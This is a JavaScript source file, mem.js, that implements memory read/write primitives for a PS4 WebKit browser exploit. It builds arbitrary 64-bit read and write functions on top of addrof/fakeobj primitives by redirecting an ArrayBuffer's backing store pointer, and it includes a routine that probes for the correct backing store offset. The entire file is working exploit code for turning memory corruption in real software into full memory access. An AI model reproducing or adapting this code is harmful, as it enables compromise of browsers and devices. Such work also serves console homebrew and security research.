// mem.js
// Memory read/write primitives for PS4 WebKit exploit

let initialized = false;
let BS_OFFSET, buf, dv, bsPtrAddr;

function read64(addr) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    return dv.getBigUint64(0, true);
}

function write64(addr, value) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    dv.setBigUint64(0, BigInt(value), true);
}


/**
 * Initialize memory primitives by finding the backing store offset and setting up DataView
 */
async function initMemory(log) {
    log('Searching for correct backing store offset...');
    let start = 0n;
    const maxOffset = 0x200n;
    const testPattern = 0xdeadbeefcafebaben;
    while (start < maxOffset) {
        try {
            // Find next candidate offset >= start
            const candidate = findBackingStoreOffset(log, start);
            log(`Candidate BS offset: 0x${candidate.toString(16)}`);
            // Setup test buffer
            buf = new ArrayBuffer(0x100);
            dv = new DataView(buf);
            const bufAddr = addrof(buf);
            bsPtrAddr = bufAddr + candidate;
            // Test write/read
            const fake = fakeobj(bsPtrAddr);
            fake[0] = testPattern;
            const readBack = dv.getBigUint64(0, true);
            if (readBack === testPattern) {
                BS_OFFSET = candidate;
                initialized = true;
                log(`Verified BS offset: 0x${BS_OFFSET.toString(16)}`);
                return;
            }
            log(`Offset 0x${candidate.toString(16)} failed, trying next...`);
            start = candidate + 8n;
        } catch(e) {
            break;
        }
    }
    throw new Error('Unable to find valid backing store offset');
}